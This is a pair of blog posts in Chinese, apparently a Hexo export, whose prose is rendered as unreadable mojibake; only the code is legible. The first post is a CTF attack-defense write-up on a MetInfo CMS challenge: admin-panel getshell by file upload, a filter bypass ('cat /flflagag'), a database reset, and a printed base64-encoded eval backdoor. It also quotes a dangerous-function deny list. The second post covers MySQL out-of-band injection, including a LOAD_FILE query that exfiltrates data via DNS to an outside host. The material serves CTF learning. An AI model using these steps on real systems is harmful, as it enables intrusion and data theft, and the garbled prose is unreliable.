<h2 id="0x01-åå°getshell"><a href="#0x01-åå°getshell" class="headerlink" title="0x01 åå°getshell"></a>0x01 åå°getshell</h2><p>è¿™ä¸ªæ´ä¹Ÿå¯ä»¥è¯´æ˜¯å‘äº†ä¸€æ³¢ï¼Œä»¥å‰éƒ½è°ƒè¿‡Metinfoçš„åå°æ¢å¤æ•°æ®åº“æ–‡ä»¶getshellï¼Œåœ¨ï¼šå®‰å…¨â€”&gt;å¤‡ä»½ä¸æ¢å¤ ä¸­é€šè¿‡ä¸Šä¼ æ•°æ®åº“å¤‡ä»½.zipæ–‡ä»¶getshellï¼Œè¿™é‡Œä¸»è¦æ˜¯å› ä¸º:admin\include\uploadify.php</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">elseif($type==<span class="string">'skin'</span>)&#123;</span><br><span class="line">/*æ¨¡æ¿æ–‡ä»¶*<span class="regexp">/</span></span><br><span class="line"><span class="regexp">$filetype=explode('.',$_FILES['Filedata']['name']);</span></span><br><span class="line"><span class="regexp">if($filetype[count($filetype)-1]=='zip')&#123;</span></span><br><span class="line"><span class="regexp">if(stristr($met_file_format,'zip') === false)&#123;</span></span><br><span class="line"><span class="regexp">echo $lang_jsx36;</span></span><br><span class="line"><span class="regexp">die();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/if(!is_writable('../</span>../templates/<span class="string">'))@chmod('</span>../../templates/<span class="string">',0777);</span></span><br><span class="line"><span class="string">$filenamearray=explode('</span>.zip<span class="string">',$_FILES['</span>Filedata<span class="string">']['</span>name<span class="string">']);</span></span><br><span class="line"><span class="string">$skin_if=$db-&gt;get_one("SELECT * FROM &#123;$met_skin_table&#125; WHERE skin_file='</span>&#123;$filenamearray[<span class="number">0</span>]&#125;<span class="string">'");</span></span><br><span class="line"><span class="string">if($skin_if)&#123;</span></span><br><span class="line"><span class="string">$metinfo=$lang_loginSkin;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">$f = new upfile('</span>zip<span class="string">','</span>../../templates/<span class="string">','</span><span class="string">','</span><span class="string">');</span></span><br><span class="line"><span class="string">if($f-&gt;get_error())&#123;</span></span><br><span class="line"><span class="string">echo $f-&gt;get_errorcode();</span></span><br><span class="line"><span class="string">die();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(file_exists('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">'))$filenamearray[0]='</span>metinfo<span class="string">'.$filenamearray[0];</span></span><br><span class="line"><span class="string">$met_upsql = $f-&gt;upload('</span>Filedata<span class="string">',$filenamearray[0]);</span></span><br><span class="line"><span class="string">include "pclzip.lib.php";</span></span><br><span class="line"><span class="string">$archive = new PclZip('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">');</span></span><br><span class="line"><span class="string">if($archive-&gt;extract(PCLZIP_OPT_PATH, '</span>../../templates/<span class="string">') == 0)$metinfo=$archive-&gt;errorInfo(true);</span></span><br><span class="line"><span class="string">$list = $archive-&gt;listContent();</span></span><br><span class="line"><span class="string">$error=0;</span></span><br><span class="line"><span class="string">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="string">if(preg_match("/\.(asp|aspx|jsp)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$error=1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(!is_dir('</span>../../templates/<span class="string">'.$val[filename])&amp;&amp;preg_match("/\.(php)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$danger=explode('</span><span class="params">|','preg_replace|</span>assert<span class="params">|dirname|</span>file_exists<span class="params">|file_get_contents|</span>file_put_contents<span class="params">|fopen|</span>mkdir<span class="params">|unlink|</span>readfile<span class="params">|eval|</span>cmd<span class="params">|passthru|</span>system<span class="params">|gzuncompress|</span>exec<span class="params">|shell_exec|</span>fsockopen<span class="params">|pfsockopen|</span>proc_open<span class="params">|scandir');</span></span><br><span class="line"><span class="params">$ban='preg_replace|</span>assert<span class="params">|eval|</span>\$_POST<span class="params">|\$_GET';</span></span><br><span class="line"><span class="params">foreach($danger as $key1 =&gt; $val1)&#123;</span></span><br><span class="line"><span class="params">$str=file_get_contents('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">$str=str_replace(array('\'','"','.'),'',$str);</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match("/([^A-Za-z0-9_]$val1)[\r\n\t]&#123;0,&#125;([\[\(])/i",$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match('/('.$ban.')/i',$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$filenamearray[0].'.zip');</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>($error)&#123;</span></span><br><span class="line"><span class="params">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(is_dir('../../templates/'.$val[filename]))&#123;</span></span><br><span class="line"><span class="params">@deldir('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">$metinfo='å«æœ‰å±é™©å‡½æ•°ï¼Œç¦æ­¢ä¸Šä¼ ï¼ï¼';</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">$metinfo='1$'.$filenamearray[0];</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ çš„.zipæ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹ï¼Œä¸Šä¼ æˆåŠŸååœ¨/templatesç›®å½•ä¸‹ç”Ÿæˆshellï¼Œç”±äºæœ¬æ¬¡æºç è¢«è°ƒæ•´è¿‡ï¼Œåœ¨æ¢å¤å¤‡ä»½æ–‡ä»¶å¤„æœ‰ä¸€ä¸ªèµ„æºè°ƒç”¨çš„é—®é¢˜ï¼Œå¯¼è‡´æ‰“å¼€çš„æ—¶å€™ç‰¹åˆ«æ…¢ï¼Œå¯ä»¥è¯´æ²¡æ³•åˆ©ç”¨å§ï¼Œè€Œè¿™æ¬¡ä¸»è¦æ˜¯åˆ©ç”¨å¦ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œç›´æ¥é€šè¿‡ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶ç±»å‹æ¥ä¸Šä¼ .phpæ–‡ä»¶ï¼šå®‰å…¨-&gt;å®‰å…¨ä¸æ•ˆç‡-&gt;ä¸Šä¼ æ–‡ä»¶<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png" alt><br>è¿™ç§getshellçš„æ–¹æ³•ä¸è¦æ™ºå•†çš„ï¼Œæ‰€ä»¥å°±ä¸å¤šè¯´äº†ã€‚</p>
<h2 id="0x02-æ··æ·†æºç å‘½ä»¤æ‰§è¡Œ"><a href="#0x02-æ··æ·†æºç å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x02 æ··æ·†æºç å‘½ä»¤æ‰§è¡Œ"></a>0x02 æ··æ·†æºç å‘½ä»¤æ‰§è¡Œ</h2><p>åˆ©ç”¨ç‚¹ï¼šprodu/picture.inc.phpæ–‡ä»¶ï¼Œæºç è¿›è¡Œæ··æ·†è¿‡ï¼Œæ‰€ä»¥æŒ–æ˜çš„æ—¶å€™å¿…é¡»é¦–å…ˆè§£æ··æ·†ï¼Œè¿™é‡Œæˆ‘æ˜¯ç›´æ¥ä¸Šç½‘è¿›è¡Œæºç ä¿®å¤çš„ï¼Œä¿®å¤å‡ºæ¥ç®€å•ä¿®æ”¹ä¸€ä¸‹å˜é‡ä¹ŸåŸºæœ¬å°±èƒ½çœ‹æ‡‚ã€‚</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http:</span></span><br><span class="line">$b=@$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Y2hlYw=='</span>)];</span><br><span class="line"><span class="keyword">if</span> ($b!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$a = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($b),<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">	$c = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($a),<span class="number">5</span>,<span class="number">18</span>);</span><br><span class="line">	$c = md5($c);</span><br><span class="line">	echo $c;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$d = @$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'img_tet'</span>)];</span><br><span class="line">$d = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSWwx'</span>)]($d);</span><br><span class="line">$d = str_replace( $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'flag'</span>),<span class="string">""</span>,$d);</span><br><span class="line"><span class="keyword">if</span> ($d!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Type: imgage/jpeg'</span>));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Disposition: attachment; filename='</span>).$d);</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Lengh: '</span>).$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$e = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbElJ'</span>)]($d,<span class="string">"r"</span>) <span class="keyword">or</span> die(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$f = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbEkx'</span>)]($e,$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbGxJ'</span>)]($e);</span><br><span class="line">	echo $f;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">echo $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Cg=='</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯Getä¸€ä¸ªå‚æ•°img_tet,æ£€æµ‹ä¼ å‚å†…å®¹æ˜¯å¦æœ‰flagï¼Œæœ‰çš„è¯å°±æ›¿æ¢ä¸ºç©ºæ ¼æ‰€ä»¥ç›´æ¥åˆ©ç”¨ï¼šcat /flflagagå°±å¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œè¿™ä¹Ÿæ˜¯å…¨åœºä¸€æ¬¡åœ¨æ‰“çš„ä¸€ä¸ªæ´ã€‚ä¸‹é¢ä¹Ÿè´´å‡ºå…¶ä»–å¸ˆå‚…è§£æ··æ·†çš„æ–¹æ³•ï¼Œå»ºä¸€ä¸ªphpæ–‡ä»¶</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'picture.inc.php'</span>);</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨å‡½æ•°var_dump(get_defined_vars())è¿›è¡Œåæ··æ·†ï¼Œæœ¬åœ°è¿è¡Œå¯ä»¥å¾—åˆ°ä¸€æ ·çš„æºç ã€‚<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-15bd7af93d209fda.png" alt><br>è¿™é‡Œç›´æ¥è´´å‡ºBXSå¸ˆå‚…å®Œå…¨ä¿®å¤çš„æºç ï¼š<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-8fdc8f0abaf18052.jpg" alt></p>
<h2 id="0x03-é‡ç½®æ•°æ®åº“"><a href="#0x03-é‡ç½®æ•°æ®åº“" class="headerlink" title="0x03 é‡ç½®æ•°æ®åº“"></a>0x03 é‡ç½®æ•°æ®åº“</h2><p>åˆ©ç”¨å®‰è£…æ¡†æ¶çš„é…ç½®æ–‡ä»¶ï¼Œé‡ç½®æ•°æ®åº“è¿™ä¸ªä¹Ÿæ˜¯è¿·ï¼Œä¸è¿‡åˆ©ç”¨èµ·æ¥ä¹Ÿæ˜¯æ²¡æœ‰éš¾åº¦çš„ï¼Œä¸»è¦å°±çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°è¿™ä¸ªé¡µé¢äº†ï¼Œä¼°è®¡æ˜¯ä¸»åŠæ–¹æ•…æ„ç•™ä¸‹è¿™ä¸ªé¡µé¢çš„ï¼Œåˆ©ç”¨æ–¹æ³•ï¼Œç›´æ¥è®¿é—® \include\frame ç›®å½•ä¸‹ index.phpï¼Œç›´æ¥å°±è¿›å…¥äº†é…ç½®é¡µé¢<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-a677562380059b89.png" alt></p>
<p>è·Ÿç€èµ°ä¸€éï¼Œé‡ç½®ä¸€ä¸‹ç½‘ç«™ï¼Œç„¶åè·³ç¬¬ä¸€æ­¥Getshellå°±å¥½ã€‚</p>
<h2 id="0x04-ä¸»åŠæ–¹è®¾ç½®çš„åé—¨åˆ©ç”¨"><a href="#0x04-ä¸»åŠæ–¹è®¾ç½®çš„åé—¨åˆ©ç”¨" class="headerlink" title="0x04 ä¸»åŠæ–¹è®¾ç½®çš„åé—¨åˆ©ç”¨"></a>0x04 ä¸»åŠæ–¹è®¾ç½®çš„åé—¨åˆ©ç”¨</h2><p>å¯¹äºè¿™ä¸ªåé—¨ï¼Œè°ƒè¯•ä¹Ÿæ˜¯åˆ°äº†æ¯”èµ›ç»“æŸåï¼Œabout/show.php 30ã€31è¡Œ</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$show_tiny=create_function(<span class="string">""</span>, base64_decode(<span class="string">'QGV2YWwoJF9QT1NUWyJpY3FjdGZlciJdKTs='</span>));</span><br><span class="line">$show_tiny();</span><br></pre></td></tr></table></figure>
<p>è§£base64åå¾—åˆ°çš„æ˜¯ä¸€ä¸ªè‡ªå¸¦åé—¨ï¼š@eval($_POST[â€œicqctferâ€]);<br>å½“æ—¶åœ¨ç°åœºçš„æ—¶å€™çœ‹åˆ°è¿™ä¸ªå°±ç›´æ¥åœ¨show.phpåç”¨POSTä¼ å‚icqctfer=<strong>****</strong>ï¼Œæ²¡æœ‰å¾—åˆ°ä»»ä½•æƒ³è¦çš„ç»“æœï¼Œå½“æ—¶è¿˜ä»¥ä¸ºå¤§å®¶éƒ½è¡¥äº†ï¼Œæ²¡æœ‰æ³¨æ„åˆ°æºç ä¸­è¿˜æœ‰é™åˆ¶æ¡ä»¶ï¼Œä¸»è¦æ˜¯åœ¨show.phpä¸­çš„<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!$id &amp;&amp; $class1)$id &#x3D; $class1;</span><br><span class="line">if(!is_numeric($id))okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">$show &#x3D; $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE id&#x3D;&#39;$id&#39; and module&#x3D;1&quot;);</span><br><span class="line">if(!$show||!$show[&#39;isshow&#39;])&#123;</span><br><span class="line">okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>is_numeric()å‡½æ•°è¦æ±‚å˜é‡idè¦æ˜¯æ•°å­—ï¼Œè¿™ä¸ªåœ°æ–¹æ¯”è¾ƒå¥½è¿‡ï¼Œç”±äºå¯¹$idæ²¡æœ‰åšä»»ä½•é™åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°è°ƒè¯•æµ‹è¯•ï¼ŒæŠŠå˜é‡idè¦†ç›–å°±å¥½äº†ï¼Œä¸è¿‡åé¢çš„æŸ¥è¯¢è¯­å¥ä¹Ÿè¦æ±‚äº†idå€¼å¾—èµ‹æˆ1ï¼Œpayload:<a href="http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1</a><br>ä¹‹åä¸»è¦æ˜¯$showå˜é‡çš„é—®é¢˜ï¼Œ $db-&gt;get_one(â€œSELECT * FROM $met_column WHERE id=â€™$idâ€™ and module=1â€)å°†è¡¨met_columnçš„ç¬¬ä¸€è¡Œä¿¡æ¯ä»¥æ•°ç»„çš„æ–¹å¼èµ‹å€¼ç»™å˜é‡showï¼Œæœ¬åœ°æŸ¥çœ‹æ•°æ®åº“<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-640ee3a29ec2e4db.png" alt><br>å…¶ä¸­isshowåˆ—é»˜è®¤å€¼ä¸º 0<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-796a9719aa2b0afb.png" alt><br>è€Œè¦è¿‡æ¡ä»¶if(!$show||!$show[â€˜isshowâ€™])åªæœ‰å½“$show = 1æˆ–è€…$show[â€˜isshowâ€™] = 1ï¼Œè€Œä»æ•°æ®åº“ä¸­çœ‹æ¥ä½¿å¾—$show = 1æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘ä»¬æ²¡æ³•æŠŠå¯¹æ–¹çš„æ•°æ®åº“id = 1çš„æ‰€æœ‰ä¿¡æ¯éƒ½ç½®1ï¼Œæ‰€ä»¥åªæœ‰å°†$show[â€˜isshowâ€™]ç½® 1 ã€‚è€Œè¦å°†å˜é‡$show[â€˜isshowâ€™]ç½® 1ï¼Œéœ€è¦è¿›å…¥Metinfoåå°ï¼šè®¾ç½®-&gt;æ ç›® ä¸­ä¿®æ”¹aboutçš„å‚æ•°ï¼Œå°† æ·»åŠ å†…å®¹ æ®µæ”¹æˆå…è®¸ï¼Œå°±å¯ä»¥å°†isshowç½®ä¸º1,ä»è€Œé€šè¿‡æ¡ä»¶ï¼Œå°±å¯ä»¥åˆ©ç”¨icqctferäº†ã€‚<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-3166828be770c331.png" alt><br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè¦æƒ³è¿›åå°ä¿®æ”¹é…ç½®åˆ©ç”¨è¿™ä¸ªåé—¨ï¼Œé™¤éä¸€ä¸Šæ‰‹åœ¨åˆ«äººæ²¡æ”¹å¯†ç ä¹‹å‰è¿›å…¥åˆ«äººåå°ä¿®æ”¹ï¼Œç­‰å¤§å®¶éƒ½æŠŠåå°å¯†ç æ”¹äº†ï¼Œä¹Ÿå°±åªæœ‰é€šè¿‡é‡ç½®æ•°æ®åº“çš„æ–¹æ³•è¿›å…¥åå°ï¼Œæ—¢ç„¶åé‡ç½®æ•°æ®åº“è¿›å…¥åå°äº†ï¼Œè¿˜ä¸å¦‚ä¸Šä¼ æœ¨é©¬æ¥æ‰“ï¼Œæ‰€ä»¥è¿™ä¸ªåé—¨çœ‹ä¼¼ç®€å•ï¼Œå…¶å®ç”¨èµ·æ¥å¤ªéº»çƒ¦ï¼Œä»·å€¼ä¹Ÿä¸é«˜ã€‚</p>
<h2 id="0x05-ç»“è¯­"><a href="#0x05-ç»“è¯­" class="headerlink" title="0x05 ç»“è¯­"></a>0x05 ç»“è¯­</h2><p>æœ¬èœå› æ‰ç–å­¦æµ…ï¼ŒåªæŒ–åˆ°äº†éƒ¨åˆ†çš„æ´ï¼Œå› ä¸ºä¸Šæ¬¡åœ¨åœºä¸Šçš„æ—¶å€™æœ‰å¸ˆå‚…ç›´æ¥æŠŠç½‘ç«™é¡µé¢ç»™æ”¹å†™äº†ï¼Œè¯´æ˜è¿˜æœ‰å…¶ä»–çš„åˆ©ç”¨ç‚¹ï¼Œè¿™é‡Œè†œä¸€ä¸‹ï¼Œæœ¬æ–‡ç« åªç”¨æ¥å­¦ä¹ è®°å½•ã€‚</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>AWD</tag>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€é“é¢˜ç›®å¼•å‘çš„MySQL-Out-of-Bandå­¦ä¹ ç¬”è®°</title>
    <url>/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ç ”ç©¶è¿™ä¸ªæ”»å‡»æ–¹å¼ä¸»è¦æ˜¯å› ä¸ºåœ¨è¿‘æœŸçš„HCTFä¸Šé‡åˆ°äº†è¿™ä¸ªæ¼æ´ç‚¹ï¼Œä¹‹å‰ä¸€ç›´æ²¡æœ‰ä»€ä¹ˆæ—¶é—´æ¥äº†è§£mysqlï¼Œæ‰€ä»¥é‡åˆ°çš„æ—¶å€™æœ‰ç‚¹æ‡µï¼Œä¸è¿‡é¢˜ç›®è€ƒç‚¹åªæ˜¯OOBçš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥èŠ±ç‚¹æ—¶é—´æŠŠoobäº†è§£çš„æ·±åˆ»ä¸€ç‚¹ã€‚</p>
<p>##0x01 ä»€ä¹ˆæ˜¯ Out-of-Band æ³¨å…¥<br> è®²å¾—é€šä¿—ä¸€ç‚¹å°±æ˜¯é€šè¿‡å…¶ä»–æ–¹å¼æ¥æå–mysqlæ•°æ®ï¼Œä¹Ÿå°±æ˜¯å¸¦å¤–æ”»å‡»ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡DNSè§£æï¼ŒHHTPï¼Œæ–‡ä»¶ç³»ç»Ÿç­‰</p>
<h2 id="0x02-MySQLçš„é™åˆ¶"><a href="#0x02-MySQLçš„é™åˆ¶" class="headerlink" title="0x02 MySQLçš„é™åˆ¶"></a>0x02 MySQLçš„é™åˆ¶</h2><p>oobæ”»å‡»ä¸»è¦æ˜¯é’ˆå¯¹MySQL 5.5.53ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œåœ¨MySQLä¸­å­˜åœ¨ä¸€ä¸ªå…¨å±€å˜é‡ï¼šsecure_file_priv,ä¸»è¦æ˜¯ç”¨æ¥é™åˆ¶æ•°æ®å†™å…¥å’Œå†™å‡ºçš„ï¼Œåœ¨5.5.53ç‰ˆæœ¬ä¹‹å‰ï¼Œå˜é‡çš„é»˜è®¤valueæ˜¯ç©ºï¼Œä¾‹å¦‚æœ¬æ¬¡æˆ‘æµ‹è¯•çš„ç¯å¢ƒï¼š<img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-722d423dcb8ab1f3.png" alt></p>
<p>è€Œ5.5.53ç‰ˆæœ¬åsecure_file_privå˜é‡é»˜è®¤å€¼ä¸ºNULLï¼Œå³æˆ‘ä»¬ä¸å¯ä»¥åˆ©ç”¨è¯¥å˜é‡è¿›è¡Œæ•°æ®å†™å…¥å†™å‡ºæ“ä½œï¼Œä½†æœ‰æ—¶æœ‰éœ€è¦ç”¨åˆ°å†™å…¥å†™å‡ºåŠŸèƒ½çš„æ—¶å€™ï¼Œå¯ä»¥å°†secure_file_privå˜é‡è®¾ç½®ä¸ºç©ºï¼Œä¾‹å¦‚ï¼Œåœ¨my.iniä¸­ç›´æ¥æ’å…¥ä¸€æ¡ï¼šsecure_file_priv=     å³å¯ã€‚</p>
<h2 id="0x03-åˆ©ç”¨INTO-OUTFILEç­‰è¯­å¥å†™å‡ºæ•°æ®"><a href="#0x03-åˆ©ç”¨INTO-OUTFILEç­‰è¯­å¥å†™å‡ºæ•°æ®" class="headerlink" title="0x03 åˆ©ç”¨INTO OUTFILEç­‰è¯­å¥å†™å‡ºæ•°æ®"></a>0x03 åˆ©ç”¨INTO OUTFILEç­‰è¯­å¥å†™å‡ºæ•°æ®</h2><p>åˆ©ç”¨INTO OUTFILEç­‰è¯­å¥å¯ä»¥å°†æŸ¥è¯¢ä¿¡æ¯å†™å‡ºåˆ°æ–‡ä»¶ä¸­<br>windowsä¸‹æµ‹è¯•ï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select @@version into outfile <span class="string">'H:\\test.txt'</span>;</span><br><span class="line">select @@version into dumpfile <span class="string">'H:\\test.txt'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-a07ddf60fed054ea.png" alt></p>
<h2 id="0x04-DNSè§£æè·å–æ•°æ®"><a href="#0x04-DNSè§£æè·å–æ•°æ®" class="headerlink" title="0x04 DNSè§£æè·å–æ•°æ®"></a>0x04 DNSè§£æè·å–æ•°æ®</h2><p>æˆ‘ä»¬ä½¿ç”¨load_file()è¯­å¥å°†æ•°æ®ä¿¡æ¯å¯¼å‡ºåˆ°å¤–éƒ¨æœåŠ¡å™¨ä¸Šï¼Œä¾‹å¦‚DNSè§£æå™¨ï¼Œä½†mysqlå°è¯•è§£æDNFæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨DNSè§£æå¼ä¸Šè·å–åˆ°æŸ¥è¯¢æ•°æ®ä¿¡æ¯ï¼Œè¿™é‡Œè´´ä¸€ä¸ªDNSè§£æçš„APIï¼š<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a><br>æŸ¥è¯¢è¯­å¥ä¾‹å¦‚ï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(<span class="string">'\\\\'</span>,version(),<span class="string">'.mysql.ip.port.8cs2vs.ceye.io\\abc'</span>));</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥åœ¨DNSæ¥å£å¤„çœ‹åˆ°æˆåŠŸè·å–åˆ°æŸ¥è¯¢æ•°æ®<br><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-49b29c165bd155a2.png" alt></p>
